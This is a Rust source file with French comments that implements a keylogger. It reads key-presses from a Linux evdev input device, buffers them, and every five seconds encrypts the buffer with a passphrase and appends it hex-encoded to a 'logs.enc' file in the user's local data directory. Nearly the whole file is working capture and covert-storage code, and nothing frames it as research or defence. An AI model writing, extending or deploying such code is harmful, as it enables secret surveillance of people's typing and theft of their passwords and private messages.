use evdev::{Device, InputEventKind};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use crate::modules::crypto::encrypt_log;
use std::fs::{self, OpenOptions};
use std::io::Write;
use hex;
use dirs;

fn write_encrypted_log(encrypted_data: Vec<u8>) {
    let log_path = dirs::data_local_dir()
        .unwrap_or_else(|| std::env::current_dir().unwrap())
        .join("logs.enc");

    // ✅ Crée le dossier si nécessaire
    if let Some(parent) = log_path.parent() {
        fs::create_dir_all(parent).expect("Impossible de créer le dossier de logs");
    }

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path)
        .unwrap();

    writeln!(file, "{}", hex::encode(encrypted_data)).unwrap();
}

pub fn start_keylogger(device_path: &str, passphrase: &str) {
    let mut dev = Device::open(device_path).expect("Impossible d'ouvrir le device");

    let buffer = Arc::new(Mutex::new(String::new()));
    let buffer_clone = Arc::clone(&buffer);
    let passphrase = passphrase.to_string(); // à cloner pour le thread

    // Thread secondaire : toutes les 5 sec on chiffre et écrit les logs
    thread::spawn(move || loop {
        thread::sleep(Duration::from_secs(5));
        let mut buf = buffer_clone.lock().unwrap();
        if !buf.is_empty() {
            let encrypted = encrypt_log(&buf, &passphrase);
            write_encrypted_log(encrypted);
            buf.clear();
        }
    });

    println!("[*] Keylogger démarré sur {device_path}");

    // Thread principal : écoute les frappes
    loop {
        for ev in dev.fetch_events().unwrap() {
            if let InputEventKind::Key(key) = ev.kind() {
                if ev.value() == 1 {
                    let mut buf = buffer.lock().unwrap();
                    buf.push_str(&format!("{:?} ", key));
                }
            }
        }
        thread::sleep(Duration::from_millis(10));
    }
}
